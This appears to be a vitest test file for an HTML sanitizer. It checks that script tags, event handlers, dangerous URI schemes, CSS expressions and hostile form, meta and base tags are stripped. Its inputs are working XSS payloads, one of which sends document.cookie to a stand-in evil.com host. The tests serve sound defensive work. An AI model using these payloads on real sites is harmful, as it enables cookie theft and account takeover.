import { describe, it, expect } from 'vitest';
import { sanitizeHtml } from './htmlSanitizer';

describe('sanitizeHtml', () => {
  describe('basic sanitization', () => {
    it('returns empty string for null input', () => {
      expect(sanitizeHtml(null as any)).toBe('');
    });

    it('returns empty string for undefined input', () => {
      expect(sanitizeHtml(undefined as any)).toBe('');
    });

    it('returns empty string for non-string input', () => {
      expect(sanitizeHtml(123 as any)).toBe('');
    });

    it('passes through safe HTML', () => {
      const input = '<strong>Bold text</strong> and <em>italic text</em>';
      const result = sanitizeHtml(input);
      expect(result).toContain('<strong>Bold text</strong>');
      expect(result).toContain('<em>italic text</em>');
    });

    it('handles plain text without tags', () => {
      const input = 'Just plain text with no HTML';
      expect(sanitizeHtml(input)).toBe('Just plain text with no HTML');
    });
  });

  describe('dangerous tag removal', () => {
    it('removes script tags and content', () => {
      const input = '<p>Safe text</p><script>alert("XSS")</script><p>More safe</p>';
      const result = sanitizeHtml(input);
      expect(result).toContain('<p>Safe text</p>');
      expect(result).toContain('<p>More safe</p>');
      expect(result).not.toContain('alert');
      expect(result).not.toContain('script');
    });

    it('removes style tags', () => {
      const input = '<p>Content</p><style>body{background:red}</style>';
      const result = sanitizeHtml(input);
      expect(result).toContain('<p>Content</p>');
      expect(result).not.toContain('background');
    });

    it('removes iframe tags', () => {
      const input = '<p>Text</p><iframe src="https://evil.com"></iframe>';
      const result = sanitizeHtml(input);
      expect(result).toContain('<p>Text</p>');
      expect(result).not.toContain('iframe');
      expect(result).not.toContain('evil.com');
    });

    it('removes object and embed tags', () => {
      const input = '<p>Safe</p><object data="malicious.swf"></object><embed src="evil.swf">';
      const result = sanitizeHtml(input);
      expect(result).toContain('<p>Safe</p>');
      expect(result).not.toContain('object');
      expect(result).not.toContain('embed');
    });

    it('removes svg and math tags', () => {
      const input = '<p>Text</p><svg><script>alert(1)</script></svg>';
      const result = sanitizeHtml(input);
      expect(result).toContain('<p>Text</p>');
      expect(result).not.toContain('svg');
      expect(result).not.toContain('alert');
    });
  });

  describe('event handler removal', () => {
    it('removes onclick handler', () => {
      const input = '<p onclick="alert(1)">Click me</p>';
      const result = sanitizeHtml(input);
      expect(result).toContain('<p>');
      expect(result).toContain('Click me');
      expect(result).not.toContain('onclick');
      expect(result).not.toContain('alert');
    });

    it('removes onerror handler', () => {
      const input = '<img src="x" onerror="alert(1)">';
      const result = sanitizeHtml(input);
      expect(result).not.toContain('onerror');
      expect(result).not.toContain('alert');
    });

    it('removes onload handler', () => {
      const input = '<div onload="malicious()">Content</div>';
      const result = sanitizeHtml(input);
      expect(result).toContain('<div>');
      expect(result).toContain('Content');
      expect(result).not.toContain('onload');
    });

    it('removes all common event handlers', () => {
      const handlers = ['onmouseover', 'onfocus', 'onblur', 'onmousedown', 'onmouseup', 'onkeydown', 'onkeyup', 'onkeypress'];
      for (const handler of handlers) {
        const input = `<div ${handler}="alert(1)">Test</div>`;
        const result = sanitizeHtml(input);
        expect(result).not.toContain(handler);
      }
    });
  });

  describe('URI scheme validation', () => {
    it('blocks javascript: href', () => {
      const input = '<a href="javascript:alert(1)">Link</a>';
      const result = sanitizeHtml(input);
      expect(result).toContain('<a');
      expect(result).toContain('Link');
      expect(result).not.toContain('javascript');
    });

    it('blocks data:text/html href', () => {
      const input = '<a href="data:text/html,<script>alert(1)</script>">Link</a>';
      const result = sanitizeHtml(input);
      expect(result).toContain('<a');
      expect(result).toContain('Link');
      expect(result).not.toContain('data:text/html');
    });

    it('blocks vbscript: href', () => {
      const input = '<a href="vbscript:msgbox(1)">Link</a>';
      const result = sanitizeHtml(input);
      expect(result).not.toContain('vbscript');
    });

    it('allows safe http href', () => {
      const input = '<a href="https://example.com">Safe Link</a>';
      const result = sanitizeHtml(input);
      expect(result).toContain('https://example.com');
      expect(result).toContain('Safe Link');
    });

    it('allows safe https href', () => {
      const input = '<a href="https://secure.example.com/page">Secure</a>';
      const result = sanitizeHtml(input);
      expect(result).toContain('https://secure.example.com/page');
    });

    it('allows mailto: href', () => {
      const input = '<a href="mailto:test@example.com">Email</a>';
      const result = sanitizeHtml(input);
      expect(result).toContain('mailto:test@example.com');
    });
  });

  describe('CSS sanitization', () => {
    it('blocks expression() in CSS', () => {
      const input = '<div style="width: expression(alert(1))">Test</div>';
      const result = sanitizeHtml(input);
      expect(result).not.toContain('expression');
    });

    it('blocks url(javascript:) in CSS', () => {
      const input = '<div style="background: url(javascript:alert(1))">Test</div>';
      const result = sanitizeHtml(input);
      expect(result).not.toContain('javascript');
    });

    it('blocks moz-binding in CSS', () => {
      const input = '<div style="-moz-binding: url(http://evil.com/xss.xml#xss)">Test</div>';
      const result = sanitizeHtml(input);
      expect(result).not.toContain('moz-binding');
      expect(result).not.toContain('evil.com');
    });

    it('allows safe color values', () => {
      const input = '<p style="color: #ff0000">Red text</p>';
      const result = sanitizeHtml(input);
      expect(result).toContain('color');
      expect(result).toContain('#ff0000');
    });

    it('allows safe font-weight', () => {
      const input = '<span style="font-weight: bold">Bold</span>';
      const result = sanitizeHtml(input);
      expect(result).toContain('font-weight');
      expect(result).toContain('bold');
    });

    it('allows safe margin and padding', () => {
      const input = '<div style="margin: 10px; padding: 5px">Content</div>';
      const result = sanitizeHtml(input);
      expect(result).toContain('margin');
      expect(result).toContain('padding');
    });

    it('allows safe color names', () => {
      const input = '<p style="color: red">Red text</p>';
      const result = sanitizeHtml(input);
      expect(result).toContain('color');
      expect(result).toContain('red');
    });
  });

  describe('HTML entity handling', () => {
    it('escapes ampersand', () => {
      const input = 'Tom & Jerry';
      const result = sanitizeHtml(input);
      expect(result).toContain('&');
    });

    it('escapes angle brackets in text', () => {
      const input = 'Use <div> tags';
      const result = sanitizeHtml(input);
      expect(result).toContain('<div>');
    });

    it('escapes quotes in text', () => {
      const input = 'She said "hello"';
      const result = sanitizeHtml(input);
      expect(result).toContain('"hello"');
    });
  });

  describe('comment removal', () => {
    it('removes HTML comments', () => {
      const input = '<!-- This is a comment --><p>Real content</p>';
      const result = sanitizeHtml(input);
      expect(result).not.toContain('<!--');
      expect(result).not.toContain('-->');
      expect(result).toContain('<p>Real content</p>');
    });

    it('removes multiple comments', () => {
      const input = '<!-- comment 1 --><p>Text</p><!-- comment 2 -->';
      const result = sanitizeHtml(input);
      expect(result).not.toContain('comment');
      expect(result).toContain('<p>Text</p>');
    });
  });

  describe('allowed tags', () => {
    it('allows div tags', () => {
      const input = '<div class="container"><div>nested</div></div>';
      const result = sanitizeHtml(input);
      expect(result).toContain('<div');
      expect(result).toContain('container');
    });

    it('allows strong tags', () => {
      const input = '<strong>Bold</strong>';
      const result = sanitizeHtml(input);
      expect(result).toContain('<strong>Bold</strong>');
    });

    it('allows em tags', () => {
      const input = '<em>Italic</em>';
      const result = sanitizeHtml(input);
      expect(result).toContain('<em>Italic</em>');
    });

    it('allows code tags', () => {
      const input = '<code>console.log("hi")</code>';
      const result = sanitizeHtml(input);
      expect(result).toContain('<code>');
      expect(result).toContain('console.log("hi")');
    });

    it('allows ul, ol, li tags', () => {
      const input = '<ul><li>Item 1</li><li>Item 2</li></ul>';
      const result = sanitizeHtml(input);
      expect(result).toContain('<ul>');
      expect(result).toContain('<li>Item 1</li>');
    });

    it('allows a tags with href', () => {
      const input = '<a href="https://example.com" class="link">Link</a>';
      const result = sanitizeHtml(input);
      expect(result).toContain('<a');
      expect(result).toContain('https://example.com');
      expect(result).toContain('link');
    });

    it('allows h3, h4, h5, h6 tags', () => {
      const input = '<h3>Heading 3</h3><h4>Heading 4</h4>';
      const result = sanitizeHtml(input);
      expect(result).toContain('<h3>Heading 3</h3>');
      expect(result).toContain('<h4>Heading 4</h4>');
    });
  });

  describe('disallowed tags', () => {
    it('removes form tags', () => {
      const input = '<form action="https://evil.com"><input type="text"></form>';
      const result = sanitizeHtml(input);
      expect(result).not.toContain('form');
      expect(result).not.toContain('input');
    });

    it('removes input tags', () => {
      const input = '<p>Before</p><input type="text" value="stolen">';
      const result = sanitizeHtml(input);
      expect(result).not.toContain('input');
      expect(result).not.toContain('stolen');
    });

    it('removes button tags', () => {
      const input = '<button onclick="steal()">Click</button>';
      const result = sanitizeHtml(input);
      expect(result).not.toContain('button');
      expect(result).not.toContain('onclick');
    });

    it('removes link tags', () => {
      const input = '<link rel="stylesheet" href="evil.css"><p>Content</p>';
      const result = sanitizeHtml(input);
      expect(result).not.toContain('link');
      expect(result).toContain('<p>Content</p>');
    });

    it('removes meta tags', () => {
      const input = '<meta http-equiv="refresh" content="0;url=https://evil.com"><p>Text</p>';
      const result = sanitizeHtml(input);
      expect(result).not.toContain('meta');
      expect(result).toContain('<p>Text</p>');
    });

    it('removes base tags', () => {
      const input = '<base href="https://evil.com"><p>Text</p>';
      const result = sanitizeHtml(input);
      expect(result).not.toContain('base');
    });
  });

  describe('attribute handling', () => {
    it('allows class attribute', () => {
      const input = '<div class="my-class">Content</div>';
      const result = sanitizeHtml(input);
      expect(result).toContain('class');
      expect(result).toContain('my-class');
    });

    it('allows style attribute with safe values', () => {
      const input = '<p style="color: red">Text</p>';
      const result = sanitizeHtml(input);
      expect(result).toContain('style');
      expect(result).toContain('color');
    });

    it('removes disallowed attributes', () => {
      const input = '<div id="test" data-value="123" tabindex="0">Content</div>';
      const result = sanitizeHtml(input);
      // id, data-value, tabindex are not in the allowed list
      expect(result).not.toContain('id=');
      expect(result).not.toContain('data-value=');
      expect(result).not.toContain('tabindex=');
    });
  });

  describe('edge cases', () => {
    it('handles malformed tags gracefully', () => {
      const input = '<p>Text < incomplete tag';
      const result = sanitizeHtml(input);
      expect(result).toContain('Text');
      // The malformed tag should be escaped as text
      expect(result).toContain('< incomplete');
    });

    it('handles nested dangerous content', () => {
      const input = '<div><script><img onerror="alert(1)"></script></div>';
      const result = sanitizeHtml(input);
      expect(result).not.toContain('script');
      expect(result).not.toContain('img');
      expect(result).not.toContain('onerror');
      expect(result).not.toContain('alert');
    });

    it('handles case-insensitive tag matching', () => {
      const input = '<SCRIPT>alert(1)</SCRIPT><Script>alert(2)</Script>';
      const result = sanitizeHtml(input);
      expect(result).not.toContain('SCRIPT');
      expect(result).not.toContain('Script');
      expect(result).not.toContain('alert');
    });

    it('handles self-closing br tags', () => {
      const input = '<p>Line 1<br>Line 2</p>';
      const result = sanitizeHtml(input);
      expect(result).toContain('Line 1');
      expect(result).toContain('Line 2');
    });

    it('prevents XSS via nested event handlers', () => {
      const input = '<a href="https://example.com" onclick="fetch(\'https://evil.com/steal?cookie=\'+document.cookie)">Link</a>';
      const result = sanitizeHtml(input);
      expect(result).not.toContain('onclick');
      expect(result).not.toContain('steal');
      expect(result).not.toContain('document.cookie');
    });

    it('prevents XSS via data URI in href', () => {
      const input = '<a href="data:text/html,<script>alert(document.cookie)</script>">Click</a>';
      const result = sanitizeHtml(input);
      expect(result).not.toContain('data:text/html');
      expect(result).not.toContain('script');
    });
  });
});
